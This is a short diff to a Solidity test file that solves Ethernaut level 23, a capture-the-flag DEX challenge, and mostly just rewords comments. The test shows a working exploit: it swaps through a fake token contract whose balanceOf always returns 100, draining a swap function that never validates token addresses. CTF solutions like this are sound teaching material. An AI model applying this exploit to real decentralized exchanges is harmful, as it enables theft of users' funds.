@@ -10,15 +10,14 @@ interface Level23 {
 }
 
 contract Level23Test is EthernautTest {
-
     function testLevel23() public {
         _createLevel("23");
 
         Level23 level23Instance = Level23(levelInstance["23"]);
 
         // There is no checking of the from or to address in the swap function
-        // We can just transfer all of the tokens to us using by calling back
-        // to this contract for transferFrom and balanceOf
+        // We can just transfer all of the tokens to us by calling back to this
+        // contract for the transferFrom and balanceOf calls
         // A value of true is needed from transferFrom and 100 for balanceOf
         // This is possible by setting the from address incorrectly
         level23Instance.swap(address(this), level23Instance.token1(), 100);
@@ -33,7 +32,7 @@ contract Level23Test is EthernautTest {
     }
 
     // We call back to this contract, returning 100 to transfer the maximum amount
-    // in the DEX of each token, 100
+    // in the DEX of each token
     function balanceOf(address) external view returns (uint256) {
         return 100;
     }
